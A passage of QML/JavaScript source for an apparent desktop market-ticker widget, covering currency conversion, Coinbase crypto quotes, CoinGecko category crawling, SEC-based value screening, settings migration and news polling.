                        + "&symbols=" + fiatWanted.map(fxSymbol).join(",") + "&fields=regularMarketPrice", x => {
                let qs = null
                try { qs = JSON.parse(x.responseText).quoteResponse.result } catch (e) {}
                if (!qs) return
                const next = Object.assign({}, fx)
                for (const q of qs) {
                    if (!(q.regularMarketPrice > 0)) continue
                    if (/-USD$/.test(q.symbol)) next[q.symbol.replace("-USD", "")] = 1 / q.regularMarketPrice
                    else next[q.symbol.replace("=X", "")] = q.regularMarketPrice
                }
                fx = next
            })
        })
    }
    Timer {
        interval: 5 * 60000; running: eng.fiatWanted.length > 0; repeat: true; triggeredOnStart: true
        onTriggered: eng.refreshFx()
    }
    // Units of `key` per dollar, or NaN when the rate is not in yet.
    function rate(key) {
        if (key === "USD") return 1
        if (key === "BTC" || key === "ETH") {
            const q = cquotes[key + "-USD"]                // live from Coinbase when crypto runs
            if (q && q.price > 0) return 1 / q.price
        }
        return fx[key] > 0 ? fx[key] : NaN
    }
    // A row in a screen's currency. Without a rate yet it stays in dollars,
    // and says so (`currency`), rather than be shown in the wrong unit.
    function inCurrency(sc, r) {
        const cur = Screens.currencyOf(sc)
        const k = rate(cur.key)
        if (cur.key === "USD" || !isFinite(k)) return Object.assign({}, r, { currency: "USD", currencySym: "$" })
        return Object.assign({}, r, {
            price: r.price * k,
            marketCap: r.marketCap * k,
            volume: r.market === "crypto" ? r.volume * k : r.volume,
            currency: cur.key, currencySym: cur.sym, usdPrice: r.price
        })
    }

    // ── crypto ────────────────────────────────────────────────────────────
    // See CRYPTO at the top. Kept apart from the stock maps so the stock
    // sessions' resets (premarket, local midnight) never touch it.
    readonly property bool cryptoOn: screens.some(s => s.market === "crypto")
    property var cproducts: ({})          // "BTC-USD" -> base currency, the USD pairs trading now
    property var cquotes: ({})            // "BTC-USD" -> row, as quotes is for stocks
    property var chist: ({})              // "BTC-USD" -> [{t, p}] the last few minutes
    property var cseenHigh: ({})          // "BTC-USD" -> highest price seen, seeded with the 24h high
    property var cinfo: ({})              // "BTC-USD" -> {name, marketCap, rank, categories}
    property string cryptoDay: ""         // the UTC date, crypto's "session"
    property bool cpassing: false
    property int cpassMs: Math.max(10, cfg.cryptoPassSeconds) * 1000
    // Is this a Coinbase pair (the detail card's chart falls back to
    // Coinbase for one Yahoo lacks)? Without a crypto screen on, the pair
    // list is not kept, so it is fetched on demand, and until it arrives any
    // "XXX-USD" is worth trying on Coinbase directly: a pair it lacks just
    // fails there too (PEPE-USD had no chart with the crypto screens off,
    // 2026-10-24).
    property real cproductsAsked: 0
    function isCryptoSymbol(sym) {
        if (cproducts[sym]) return true
        if (!/^[A-Z0-9]{1,15}-USD$/.test(sym || "")) return false
        if (Date.now() - cproductsAsked > 6 * 3600000) refreshCryptoProducts(true)
        return !Object.keys(cproducts).length
    }

    function refreshCryptoProducts(force) {
        if (!cryptoOn && !force) return
        cproductsAsked = Date.now()
        ticker.yget("https://api.exchange.coinbase.com/products", x => {
            let list = null
            try { list = JSON.parse(x.responseText) } catch (e) {}
            if (!Array.isArray(list)) return
            const out = {}
            for (const p of list)
                // Stablecoins stay in: they barely move, so they seldom
                // alert -- and when one does, it is a depeg (their own theme).
                if (p.quote_currency === "USD" && p.status === "online" && !p.trading_disabled)
                    out[p.id] = p.base_currency
            if (Object.keys(out).length) { cproducts = out; cryptoPass() }
        })
    }
    // One request for every pair. Backs off while Coinbase refuses, as the
    // stock pass does with Yahoo.
    function cryptoPass() {
        if (!cryptoOn || cpassing || !Object.keys(cproducts).length) return
        cpassing = true
        ticker.yget("https://api.exchange.coinbase.com/products/stats", x => {
            cpassing = false
            let d = null
            try { d = JSON.parse(x.responseText) } catch (e) {}
            if (!d || typeof d !== "object" || d.message) { cpassMs = Math.max(Math.max(10, cfg.cryptoPassSeconds) * 1000, Math.min(cpassMs * 2, 120000)); return }
            cpassMs = Math.max(10, cfg.cryptoPassSeconds) * 1000
            const now = Date.now()
            for (const sym in cproducts) if (d[sym]) takeCrypto(sym, d[sym], now)
            buildRanked()
            noteCryptoThemes()
            lookupCryptoGaps()
            updated = new Date()
        })
    }
    function takeCrypto(sym, s, now) {
        const day = s.stats_24hour || {}, month = s.stats_30day || {}
        const price = +day.last, open = +day.open, high = +day.high, low = +day.low, vol = +day.volume
        if (!(price > 0)) return
        const avg = +month.volume / 30
        const c = cinfo[sym] || {}
        const r = {
            symbol: sym, market: "crypto", name: c.name || cproducts[sym],
            price: price,
            change: open > 0 ? (price / open - 1) * 100 : NaN,
            gap: NaN,
            volume: vol > 0 ? vol * price : NaN,          // dollars, over 24 hours
            rvol: avg > 0 && vol >= 0 ? vol / avg : NaN,
            rvol5: NaN,
            marketCap: c.marketCap,
            offLow: low > 0 ? (price / low - 1) * 100 : NaN
        }
        cquotes[sym] = r
        const h = (chist[sym] || []).filter(x => now - x.t < 6 * 60000)
        const first = !chist[sym]
        h.push({ t: now, p: price })
        chist[sym] = h
        const st = cseenHigh[sym]
        if (first || st === undefined) { cseenHigh[sym] = Math.max(high > 0 ? high : price, price); return }
        fire("crypto", sym, r, h, price, st, now)
        cseenHigh[sym] = Math.max(st, price)
    }

    // ── crypto themes ─────────────────────────────────────────────────────
    // CoinGecko (free, no key) is the taxonomy: its categories -- AI, Meme,
    // DePIN, Layer 2 -- are the crypto equivalent of the stock industries,
    // already sorted. The result is kept in the database (cryptoinfo), so a
    // restart reads it back instead of crawling again. A full crawl runs once
    // a week: the top 1,000 coins by market cap (names, caps, and which
    // CoinGecko coin a Coinbase ticker is -- the biggest of that symbol), then
    // each theme's categories: 18 requests, 15 seconds apart. A refused request
    // goes to the back of the queue, up to three tries, and the spacing doubles
    // to at most a minute. A coin outside the top 1,000 gets one lookup of its
    // own, once a session, when it reaches a crypto screen.
    property var cgQueue: []
    property int cgDelay: 15000
    property var cgBySym: ({})            // building: "ETH" -> {id, name, cap, rank}
    property var cgCats: ({})             // building: CoinGecko id -> [category ids]
    property int cgFailed: 0              // building: crawl requests given up on
    property bool cgCrawling: false
    property var cgNames: ({})            // CoinGecko category name -> category id
    property var cgLooked: ({})           // symbols given their own lookup this session
    property var cinfoAt: ({})            // "BTC-USD" -> when its row was fetched (ms); "*" -> the last full crawl
    property bool cinfoLoaded: false
    readonly property real cinfoMaxAgeMs: 7 * 86400000

    // Reads the saved taxonomy back into cinfo, once.
    function loadCryptoInfo() {
        cinfoLoaded = true
        if (!openThemeDb()) return
        try {
            db.readTransaction(tx => {
                const rs = tx.executeSql("SELECT symbol, name, marketCap, rank, categories, at FROM cryptoinfo")
                const out = Object.assign({}, cinfo), at = {}
                for (let i = 0; i < rs.rows.length; i++) {
                    const r = rs.rows.item(i)
                    at[r.symbol] = r.at
                    if (r.symbol !== "*")
                        out[r.symbol] = { name: r.name, marketCap: r.marketCap || undefined, rank: r.rank || undefined,
                                          categories: r.categories ? r.categories.split(",") : [] }
                }
                cinfo = out
                cinfoAt = at
            })
        } catch (e) {
            console.warn("marketticker: crypto info unavailable:", e)
        }
    }
    // Rows of { symbol, name, marketCap, rank, categories, at }: merged into
    // cinfo and saved. `at` is when the row was fetched, 0 to retry it next pass.
    function takeCryptoRows(rows) {
        if (!rows.length) return
        const out = Object.assign({}, cinfo), at = Object.assign({}, cinfoAt)
        for (const r of rows) {
            if (r.symbol !== "*") out[r.symbol] = { name: r.name, marketCap: r.marketCap, rank: r.rank, categories: r.categories }
            at[r.symbol] = r.at
        }
        cinfo = out
        cinfoAt = at
        if (!openThemeDb()) return
        db.transaction(tx => {
            for (const r of rows)
                tx.executeSql("INSERT OR REPLACE INTO cryptoinfo VALUES (?, ?, ?, ?, ?, ?)",
                              [r.symbol, r.name || "", r.marketCap || null, r.rank || null,
                               (r.categories || []).join(","), r.at])
        })
    }
    function refreshCryptoInfo() {
        if (!cryptoOn || cgCrawling) return
        if (!cinfoLoaded) loadCryptoInfo()
        const crawled = cinfoAt["*"] || 0
        if (crawled && Date.now() - crawled < cinfoMaxAgeMs) { lookupCryptoGaps(); return }
        const q = []
        for (let page = 1; page <= 4; page++)
            q.push({ url: "coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=" + page, cat: "", tries: 0 })
        for (const cat of Themes.cryptoCategories())
            q.push({ url: "coins/markets?vs_currency=usd&category=" + cat + "&per_page=250&page=1", cat: cat, tries: 0 })
        cgBySym = ({}); cgCats = ({}); cgDelay = 15000; cgFailed = 0; cgLooked = ({})
        cgCrawling = true
        cgQueue = q
    }
    function cgNext() {
        if (!cgQueue.length) return
        const job = cgQueue[0]
        cgQueue = cgQueue.slice(1)
        if (job.gap) return cgGap(job)
        if (job.names) return cgNamesLoad()
        ticker.yget("https://api.coingecko.com/api/v3/" + job.url, x => {
            let list = null
            try { list = JSON.parse(x.responseText) } catch (e) {}
            if (!Array.isArray(list)) {
                list = []
                if (job.tries < 2) {
                    cgQueue = cgQueue.concat([Object.assign({}, job, { tries: job.tries + 1 })])
                    cgDelay = Math.min(cgDelay * 2, 60000)
                } else cgFailed++
            }
            for (const c of list) {
                if (!job.cat) {
                    const s = String(c.symbol || "").toUpperCase()
                    if (!cgBySym[s] || (c.market_cap || 0) > cgBySym[s].cap)
                        cgBySym[s] = { id: c.id, name: c.name, cap: c.market_cap || 0, rank: c.market_cap_rank }
                } else (cgCats[c.id] = cgCats[c.id] || []).push(job.cat)
            }
            if (!cgQueue.length && cgCrawling) finishCrawl()
        })
    }
    function finishCrawl() {
        cgCrawling = false
        const now = Date.now(), rows = []
        for (const sym in cproducts) {
            const g = cgBySym[cproducts[sym]]
            if (!g) continue
            const cats = cgCats[g.id] || []
            // After a lost request an empty row is retried, not kept for a week.
            rows.push({ symbol: sym, name: g.name, marketCap: g.cap, rank: g.rank, categories: cats,
                        at: (cats.length || cgFailed === 0) ? now : 0 })
        }
        takeCryptoRows(rows)
        if (cgFailed === 0 && rows.length) takeCryptoRows([{ symbol: "*", name: "", categories: [], at: now }])
        lookupCryptoGaps()
    }
    // A coin on a crypto screen that the crawl did not place (outside the top
    // 1,000, or lost to a failed request) gets its own lookup, once a session.
    function lookupCryptoGaps() {
        if (!cryptoOn || cgCrawling) return
        const gaps = Array.from(sourceSymbols("crypto")).filter(s => cproducts[s] && !cinfoAt[s] && !cgLooked[s])
        if (!gaps.length) return
        const q = cgQueue.slice()
        if (!Object.keys(cgNames).length) q.push({ names: true, tries: 0 })
        for (const s of gaps) {
            cgLooked[s] = true
            q.push({ gap: s, stage: "search", tries: 0 })
        }
        cgQueue = q
    }
    // A coin's description from CoinGecko, for its quote card. Looked up by
    // symbol once and kept (cryptoabout), an empty text too, so a coin
    // CoinGecko does not know is not asked again.
    property var cdesc: ({})              // "BTC-USD" -> description text, "" for none
    function cryptoAbout(sym, done) {
        const keep = text => {
            cdesc = Object.assign({}, cdesc, { [sym]: text })
            done(text)
            if (openThemeDb()) db.transaction(tx => tx.executeSql("INSERT OR REPLACE INTO cryptoabout VALUES (?, ?, ?)", [sym, text, Date.now()]))
        }
        if (cdesc[sym] !== undefined) return done(cdesc[sym])
        if (openThemeDb()) {
            try {
                db.readTransaction(tx => {
                    const rs = tx.executeSql("SELECT text FROM cryptoabout WHERE symbol = ?", [sym])
                    if (rs.rows.length) cdesc = Object.assign({}, cdesc, { [sym]: rs.rows.item(0).text })
                })
            } catch (e) {}
            if (cdesc[sym] !== undefined) return done(cdesc[sym])
        }
        const base = sym.replace(/-USD$/, "")
        ticker.yget("https://api.coingecko.com/api/v3/search?query=" + encodeURIComponent(base), x => {
            let d = null
            try { d = JSON.parse(x.responseText) } catch (e) {}
            if (!d || !Array.isArray(d.coins)) return
            const hits = d.coins.filter(c => String(c.symbol || "").toUpperCase() === base)
                                .sort((a, b) => (a.market_cap_rank || 1e9) - (b.market_cap_rank || 1e9))
            if (!hits.length) return keep("")
            ticker.yget("https://api.coingecko.com/api/v3/coins/" + encodeURIComponent(hits[0].id)
                        + "?localization=false&tickers=false&market_data=false&community_data=false&developer_data=false&sparkline=false", y => {
                let c = null
                try { c = JSON.parse(y.responseText) } catch (e) {}
                if (!c || !c.id) return
                keep(String((c.description || {}).en || "").replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim())
            })
        })
    }
    function cgNamesLoad() {
        ticker.yget("https://api.coingecko.com/api/v3/coins/categories/list", x => {
            let list = null
            try { list = JSON.parse(x.responseText) } catch (e) {}
            if (!Array.isArray(list)) return
            const m = {}
            for (const k of list) m[k.name] = k.category_id
            cgNames = m
        })
    }
    function cgGap(job) {
        const now = Date.now()
        const retry = () => {
            if (job.tries < 2) cgQueue = cgQueue.concat([Object.assign({}, job, { tries: job.tries + 1 })])
            else takeCryptoRows([{ symbol: job.gap, name: "", categories: [], at: 0 }])
        }
        if (job.stage === "search") {
            ticker.yget("https://api.coingecko.com/api/v3/search?query=" + encodeURIComponent(job.gap), x => {
                let d = null
                try { d = JSON.parse(x.responseText) } catch (e) {}
                if (!d || !Array.isArray(d.coins)) return retry()
                const hits = d.coins.filter(c => String(c.symbol || "").toUpperCase() === job.gap)
                                    .sort((a, b) => (a.market_cap_rank || 1e9) - (b.market_cap_rank || 1e9))
                if (!hits.length) return takeCryptoRows([{ symbol: job.gap, name: "", categories: [], at: now }])
                cgQueue = [{ gap: job.gap, stage: "detail", id: hits[0].id, tries: 0 }].concat(cgQueue)
            })
            return
        }
        // The coin's own categories come back by name; cgNames maps them to the catalog's ids.
        if (!Object.keys(cgNames).length) {
            if (job.tries < 3) cgQueue = cgQueue.concat([Object.assign({}, job, { tries: job.tries + 1 })])
            else takeCryptoRows([{ symbol: job.gap, name: "", categories: [], at: 0 }])
            return
        }
        ticker.yget("https://api.coingecko.com/api/v3/coins/" + encodeURIComponent(job.id)
                    + "?localization=false&tickers=false&market_data=false&community_data=false&developer_data=false&sparkline=false", x => {
            let c = null
            try { c = JSON.parse(x.responseText) } catch (e) {}
            if (!c || !c.id) return retry()
            const cats = (c.categories || []).map(n => cgNames[n]).filter(Boolean)
            takeCryptoRows([{ symbol: job.gap, name: c.name || "", rank: c.market_cap_rank, categories: cats, at: now }])
        })
    }
    // The crypto tally, as noteThemes is for stocks: members are the
    // symbols that reached a crypto screen today, peaks the best 24-hour
    // change seen. Filed under the UTC date.
    function noteCryptoThemes() {
        if (!cryptoDay || (!cfg.sectorsOn && !cfg.themesOn)) return
        const next = {}
        const dirty = []
        const stuck = []
        const syms = sourceSymbols("crypto")
        if (syms.length) noteSession("crypto", cryptoDay)
        for (const sym of syms) {
            const q = cquotes[sym]
            if (!q || !isFinite(q.change)) continue
            const headline = (newsFor(sym) || {}).title || ""
            const th = cfg.themesOn ? themeOf(sym) : null
            if (th && th.via === "words") stuck.push([sym, th.id])
            for (const t of [th, cfg.sectorsOn ? sectorOf(sym) : null]) {
                if (!t) continue
                const prev = (themeLive[t.id] || {})[sym]
                const peak = Math.max(q.change, prev ? prev.peak : -Infinity)
                if (!next[t.id]) next[t.id] = Object.assign({}, themeLive[t.id] || {})
                const m = { peak: peak, shell: false, fresh: prev ? prev.fresh : themeFresh(t.id, sym), headline: headline }
                next[t.id][sym] = m
                if (!prev || prev.peak !== peak)
                    dirty.push([t.id, sym, (cinfo[sym] || {}).categories ? cinfo[sym].categories.join(",") : "", headline, m])
            }
        }
        noteSticky(stuck, cryptoDay)
        if (!dirty.length) return
        for (const id in themeLive) if (!next[id]) next[id] = themeLive[id]
        themeLive = next
        storeMembers(dirty, cryptoDay)
    }
    Timer {
        interval: 6 * 3600000; running: eng.cryptoOn; repeat: true; triggeredOnStart: true
        onTriggered: { eng.refreshCryptoProducts(); eng.refreshCryptoInfo() }
    }
    Timer {
        interval: eng.cpassMs; running: eng.cryptoOn; repeat: true
        onTriggered: eng.cryptoPass()
    }
    Timer {
        interval: eng.cgDelay; running: eng.cgQueue.length > 0; repeat: true
        onTriggered: eng.cgNext()
    }

    // ── long-term value ───────────────────────────────────────────────────
    // The universe: US companies worth `valueCapMin` or more (about 1,500
    // at $2B), from a Yahoo screen refreshed every 6 hours; they join the
    // pool so every pass quotes them. Their fundamentals -- eight checks
    // from SEC filings, computed by the scanner's pillars.py with
    // today's price -- are worked through in batches of 40, one batch at a
    // time, and redone once a day per company (filings change quarterly).
    // The first full run takes a while; results are kept in the alert
    // database, so a restart does not repeat it.
    property var valueUniverse: []
    property var valueData: ({})          // symbol -> {passed, scored, pillars, at}
    property var maSlope: ({})            // symbol -> {pct, at}: 50-day average's change over 10 sessions
    property bool valueBusy: false
    // Companies with results from the last day, for the status line.
    readonly property int valueDone: Object.keys(valueData).filter(s => Date.now() - valueData[s].at <= 24 * 3600000).length

    function refreshValueUniverse(offset, acc) {
        offset = offset || 0
        acc = acc || []
        ticker.withCrumb(c => {
            const x = new XMLHttpRequest()
            x.onreadystatechange = () => {
                if (x.readyState !== XMLHttpRequest.DONE) return
                let res = null
                try { res = JSON.parse(x.responseText).finance.result[0] } catch (e) {}
                if (!res) { if (acc.length) valueUniverse = acc; return }
                acc = acc.concat(res.quotes.map(q => q.symbol).filter(validSymbol))
                if (offset + 250 < Math.min(res.total, 3000)) refreshValueUniverse(offset + 250, acc)
                else { valueUniverse = acc; candidates = Array.from(new Set(candidates.concat(acc))) }
            }
            x.open("POST", "https://query1.finance.yahoo.com/v1/finance/screener?crumb=" + encodeURIComponent(c))
            x.setRequestHeader("User-Agent", "Mozilla/5.0")
            x.setRequestHeader("Content-Type", "application/json")
            const exch = ["NMS", "NCM", "NGM", "NYQ", "ASE"]
                .map(e => ({ operator: "eq", operands: ["exchange", e] }))
            x.send(JSON.stringify({
                offset: offset, size: 250, sortField: "intradaymarketcap", sortType: "DESC", quoteType: "EQUITY",
                query: { operator: "AND", operands: [
                    { operator: "eq", operands: ["region", "us"] },
                    { operator: "or", operands: exch },
                    { operator: "gt", operands: ["intradaymarketcap", cfg.valueCapMin] }
                ]}
            }))
        })
    }

    // Symbols a scorecard asked fundamentals for (rows() via wantValue),
    // ahead of the value universe. Asked once each.
    property var valueWanted: []
    property var valueAsked: ({})
    function wantValue(syms) {
        const add = syms.filter(s => !valueAsked[s] && validSymbol(s))
        if (!add.length) return
        for (const s of add) valueAsked[s] = true
        valueWanted = valueWanted.concat(add)
        if (!valueBusy) valueSoon.start()
    }

    // The next batch: wanted symbols first, then companies with a quote and
    // no result from today.
    function valueWork() {
        if (valueBusy || (!hasValueScreen() && !valueWanted.length)) return
        const day = 24 * 3600000, now = Date.now()
        const wanted = valueWanted.filter(s => quotes[s]).slice(0, 40)
        valueWanted = valueWanted.filter(s => wanted.indexOf(s) < 0)
        // A company the scanner could not score (a foreign filer with no SEC
        // financial data, say) is retried weekly, not daily -- before
        // 2026-10-24 a failure left it "due", and the same batch of 31 went
        // round every two minutes, 80 seconds of SEC requests each time.
        const due = wanted.concat(hasValueScreen()
            ? valueUniverse.filter(s => quotes[s] && wanted.indexOf(s) < 0
                                   && (!valueData[s] || now - valueData[s].at > (valueData[s].failed ? 7 * day : day)))
            : []).slice(0, 40)
        if (!due.length) return
        valueBusy = true
        const args = due.map(s => s + ":" + quotes[s].price + ":" + (quotes[s].shares > 0 ? quotes[s].shares : ""))
        bridgeRun(["value"].concat(args), out => {
            valueBusy = false
            // No answer, or the whole call failed (no SEC contact set, the
            // scanner missing): try again later, nobody marked failed.
            if (!out || out.error) return
            const next = Object.assign({}, valueData)
            for (const s in out) {
                next[s] = Object.assign(out[s], { at: Date.now() })
                storeValue(s, next[s])
            }
            for (const s of due) {
                if (out[s]) continue
                next[s] = { failed: true, at: Date.now() }
                storeValue(s, next[s])
            }
            valueData = next
            // Straight on to the next batch, unless Settings → Performance
            // has slowed the value checks down.
            if (cfg.valueMinutes <= 2) valueSoon.start()
        }, 300)
    }
    Timer { id: valueSoon; interval: 3000; onTriggered: eng.valueWork() }
    function hasValueScreen() { return screens.some(s => s.type === "value") }

    // The 50-day average's direction, from a year of daily closes, for the
    // companies close to qualifying: most checks pass and the price is back
    // above a 50-day that is still under the 200-day. Twice a day each.
    function slopeWork() {
        const now = Date.now()
        const near = Object.keys(valueData).filter(s => {
            const q = quotes[s], v = valueData[s]
            return q && v.passed >= 5 && q.price > q.ma50 && q.ma50 < q.ma200
                && (!maSlope[s] || now - maSlope[s].at > 12 * 3600000)
        }).slice(0, 20)
        for (const s of near) {
            ticker.yget("https://query1.finance.yahoo.com/v8/finance/chart/" + encodeURIComponent(s)
                        + "?interval=1d&range=1y", x => {
                try {
                    const c = JSON.parse(x.responseText).chart.result[0].indicators.quote[0].close
                                  .filter(v => typeof v === "number")
                    if (c.length < 70) return
                    const sma = end => c.slice(end - 50, end).reduce((a, b) => a + b, 0) / 50
                    const m = Object.assign({}, maSlope)
                    m[s] = { pct: (sma(c.length) / sma(c.length - 10) - 1) * 100, at: Date.now() }
                    maSlope = m
                } catch (e) {}
            })
        }
    }

    // The rows of a value screen: every company with a result and a quote,
    // its figures, the trend checks, then the screen's filters; most checks
    // passed first, and among equals the earliest in its recovery (closest
    // above its 50-day) first.
    function num(text) {
        const m = String(text || "").match(/-?[\d.]+/)
        return m ? parseFloat(m[0]) : NaN
    }
    // The value figures for one row (a quote, or an alert carrying one):
    // fundamentals where the company has been checked, the trend from its
    // moving averages. Used by value lists and by any screen showing these
    // columns.
    function valueFields(q) {
        const v0 = valueData[q.symbol]
        const v = v0 && !v0.failed ? v0 : null      // a failed check is no result
        const pill = n => (v && v.pillars || []).find(p => p.n === n) || {}
        const slope = maSlope[q.symbol]
        return {
            value: v,
            valuePassed: v ? v.passed : NaN,
            valueScored: v ? v.scored : NaN,
            pe5: num(pill(1).value), roic: num(pill(2).value), pfcf: num(pill(8).value),
            vs50: q.ma50 > 0 ? (q.price / q.ma50 - 1) * 100 : NaN,
            trend: q.ma50 > 0 && q.ma200 > 0 ? (q.ma50 / q.ma200 - 1) * 100 : NaN,
            off52: q.low52 > 0 ? (q.price / q.low52 - 1) * 100 : NaN,
            offHigh: q.high52 > 0 ? (1 - q.price / q.high52) * 100 : NaN,
            maSlope: slope ? slope.pct : NaN,
            valuationOk: pill(1).passed === true && pill(8).passed === true,
            pfcfOk: pill(8).passed === true,
            above50: q.ma50 > 0 ? q.price > q.ma50 : undefined,
            below200: q.ma50 > 0 && q.ma200 > 0 ? q.ma50 < q.ma200 : undefined,
            turningUp: slope ? slope.pct > 0 : undefined
        }
    }
    function valueRows(sc) {
        const out = []
        for (const s in valueData) {
            const q = quotes[s]
            if (!q || valueData[s].failed) continue
            const r = Object.assign({}, q, valueFields(q))
            if (Screens.passes(sc, inCurrency(sc, r), "quote")) out.push(r)
        }
        out.sort((a, b) => (b.valuePassed - a.valuePassed) || (a.vs50 - b.vs50))
        return out.slice(0, Screens.rankCountOf(sc) * 2)
    }

    function storeValue(sym, v) {
        if (!openDb()) return
        db.transaction(tx => {
            tx.executeSql("CREATE TABLE IF NOT EXISTS value (symbol TEXT PRIMARY KEY, at INTEGER, row TEXT)")
            tx.executeSql("INSERT OR REPLACE INTO value VALUES (?, ?, ?)", [sym, v.at, JSON.stringify(v)])
        })
    }
    function restoreValue() {
        if (!openDb()) return
        db.transaction(tx => {
            tx.executeSql("CREATE TABLE IF NOT EXISTS value (symbol TEXT PRIMARY KEY, at INTEGER, row TEXT)")
            // Older than a week is dropped rather than kept as if current.
            tx.executeSql("DELETE FROM value WHERE at < ?", [Date.now() - 7 * 24 * 3600000])
            const rs = tx.executeSql("SELECT symbol, row FROM value")
            const v = {}
            for (let i = 0; i < rs.rows.length; i++) {
                try { v[rs.rows.item(i).symbol] = JSON.parse(rs.rows.item(i).row) } catch (e) {}
            }
            valueData = v
        })
    }

    // The Deep Value Recovery screen and the Deep Value 8 scorecard joined
    // the starting lists on 2026-10-22. Screens or scorecards saved before
    // that get them added once; `valueAdded` records it, so deleting them
    // later sticks.
    function addValueScreenOnce() {
        // A saved Deep Value screen still on the first rules gets the
        // current ones (screens.js, deepValue); one the user has edited keeps
        // theirs.
        if (cfg.screens) {
            try {
                const l = JSON.parse(cfg.screens)
                const dv = Array.isArray(l) ? l.find(s => s.id === "deepvalue") : null
                if (dv && JSON.stringify(dv.filters) === JSON.stringify(Screens.deepValueFiltersV1)) {
                    dv.filters = Screens.deepValueFilters()
                    Plasmoid.configuration.screens = JSON.stringify(l)
                }
            } catch (e) {}
        }
        // Since 2026-10-22, Top Gainers and Top Losers show the value
        // columns (they serve long-term investing, not day trades). Set once;
        // a screen whose columns were already chosen is left alone.
        if (!cfg.rankedValueColumns) {
            try {
                const all = JSON.parse(cfg.screenerLayout || "{}")
                const shown = ["symbol", "score", "price", "change", "volume", "marketCap", "pe5", "pfcf",
                               "roic", "vs50", "trend", "offHigh", "off52", "dilution", "missed"]
                for (const id of ["gainers", "losers"]) if (!all[id]) all[id] = { shown: shown }
                Plasmoid.configuration.screenerLayout = JSON.stringify(all)
            } catch (e) {}
            Plasmoid.configuration.rankedValueColumns = true
        }
        // The Theme Hunter joined on 2026-10-24; added once, at the end.
        if (cfg.screens && !cfg.hunterAdded) {
            try {
                const l = JSON.parse(cfg.screens)
                if (Array.isArray(l) && !l.some(s => s.type === "hunter")) {
                    l.push(Screens.themeHunter("stocks"))
                    Plasmoid.configuration.screens = JSON.stringify(l)
                }
            } catch (e) {}
            Plasmoid.configuration.hunterAdded = true
        }
        // The pattern themes (no-news runners, foreign low-float, oil & gas)
        // joined the starters on 2026-10-26, and Drones & defense took its
        // industry too. A saved theme list gets them once; deleting them
        // later sticks.
        if (cfg.customThemes && !cfg.themePatternsAdded) {
            try {
                const l = JSON.parse(cfg.customThemes)
                if (Array.isArray(l)) {
                    for (const t of Themes.patternStarters())
                        if (!l.some(x => x.id === t.id)) l.push(Object.assign({}, t, { tickers: [] }))
                    const def = l.find(x => x.id === "defense")
                    if (def && !(def.industries && def.industries.length)) def.industries = Themes.defenseIndustries()
                    Plasmoid.configuration.customThemes = JSON.stringify(l)
                }
            } catch (e) {}
        }
        Plasmoid.configuration.themePatternsAdded = true
        // Top Losers joined the starting list the same day; added once too.
        if (cfg.screens && !cfg.losersAdded) {
            try {
                const l = JSON.parse(cfg.screens)
                if (Array.isArray(l) && !l.some(s => s.id === "losers")) {
                    const at = l.findIndex(s => s.id === "gainers")
                    l.splice(at >= 0 ? at + 1 : l.length, 0, Screens.topLosers())
                    Plasmoid.configuration.screens = JSON.stringify(l)
                }
            } catch (e) {}
        }
        Plasmoid.configuration.losersAdded = true
        if (cfg.valueAdded) return
        if (cfg.screens) {
            try {
                const l = JSON.parse(cfg.screens)
                if (Array.isArray(l) && !l.some(s => s.id === "deepvalue")) {
                    l.push(Screens.deepValue())
                    Plasmoid.configuration.screens = JSON.stringify(l)
                }
            } catch (e) {}
        }
        if (cfg.scorecards) {
            try {
                const l = JSON.parse(cfg.scorecards)
                if (Array.isArray(l) && !l.some(c => c.id === "deepvalue")) {
                    l.push(Scorecards.deepValue())
                    Plasmoid.configuration.scorecards = JSON.stringify(l)
                }
            } catch (e) {}
        }
        Plasmoid.configuration.valueAdded = true
    }

    Timer {
        interval: 6 * 3600000; running: true; repeat: true; triggeredOnStart: true
        onTriggered: { eng.addValueScreenOnce(); eng.restoreValue(); if (eng.hasValueScreen()) eng.refreshValueUniverse() }
    }
    Timer {
        interval: Math.max(1, eng.cfg.valueMinutes) * 60000; running: true; repeat: true
        onTriggered: { eng.valueWork(); eng.slopeWork() }
    }

    // ── market news ───────────────────────────────────────────────────────
    // The newest market headlines from the scanner's news.py
    // (Seeking Alpha, MarketWatch and CNBC desks), every 3 minutes, for the
    // News tab. [{title, url, source, time}], newest first.
    property var marketNews: []
    property date marketNewsAt
    function refreshMarketNews() {
        if (!cfg.newsBuiltins) { marketNews = []; return }
        bridgeRun(["marketnews", "40"], out => {
            if (Array.isArray(out)) { marketNews = out; marketNewsAt = new Date() }
        })
    }
    Timer {
        interval: 3 * 60000; running: true; repeat: true; triggeredOnStart: true
        onTriggered: eng.refreshMarketNews()
    }

    // ── your news sources ─────────────────────────────────────────────────
    // Settings → Data → News sources (newsfeeds.js): RSS, Atom or JSON, each
    // with an optional header for a paid feed's key, every `newsPollSeconds`.
    // Their headlines join the News tab and each ticker's news, and a newer
    // one that names a ticker replaces that row's headline -- so the "News
    // within" filter, the news marker and the theme tagging all see it.
    readonly property var newsSources: NewsFeeds.load(cfg).filter(s => s.on !== false && s.url)
    property var customNews: []           // every source's items, newest first, last 48 hours
    property date customNewsAt
    property var newsErrors: ({})         // source name -> why it returned nothing, or absent
    property var newsByTicker: ({})       // ticker -> its newest item, rebuilt with customNews
    function refreshCustomNews() {
        const list = newsSources
        if (!list.length) { customNews = []; return }
        let left = list.length
        const got = [], errs = {}
        for (const s of list) {
            NewsFeeds.fetch(s, (items, err) => {
                if (err) errs[s.name] = err
                for (const it of items) got.push(it)
                if (--left) return
                const cut = Date.now() - 48 * 3600000, seen = {}, out = []
                got.sort((a, b) => b.time - a.time)
                for (const it of got) {
                    const key = it.title.toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 60)
                    if (it.time < cut || it.time > Date.now() + 2 * 3600000 || seen[key]) continue
                    seen[key] = true
                    out.push(it)
                }
                customNews = out.slice(0, 400)
                const by = {}
                for (const it of customNews) for (const tk of it.tickers) if (!by[tk]) by[tk] = it
                newsByTicker = by
                customNewsAt = new Date()
                newsErrors = errs
            })
        }
    }
    // The newest of your headlines naming `sym`, or null.
    // Article pictures: the feed's own, else the page's preview image
    // (newsfeeds.js pageImage), read three pages at a time and only for
    // headlines on screen. url -> image url, or "" for none. Off with
    // `newsImages`. In memory only; a restart reads them again.
    property var articleImages: ({})
    property var imageQueue: []
    property int imageBusy: 0
    property var imageInflight: ({})      // url -> {t, req}, for the watchdog below
    function wantImage(url) {
